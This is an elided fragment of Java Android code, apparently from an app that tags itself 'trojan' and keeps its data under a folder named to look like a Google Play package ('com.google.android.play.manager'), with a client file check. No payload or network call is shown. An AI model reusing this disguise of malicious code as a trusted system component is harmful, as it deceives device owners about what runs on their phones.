...
public class ServerUtils {
    ...
    private static String TAG1 = "trojan";
    ...
    public ServerUtils(Context context) {
        ...
        DOC_FOLDER_EXT_DEFAULT = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.google.android.play.manager";
        DOC_FOLDER_LOCAL_DEFAULT = PATH_TO_INSTALL_SERVER + "/Android/data/com.google.android.play.manager";
    ...
    public boolean checkHotspot(String client) {
        if (new File(DOC_FOLDER + "/client/"+client).exists()) {
            return true;
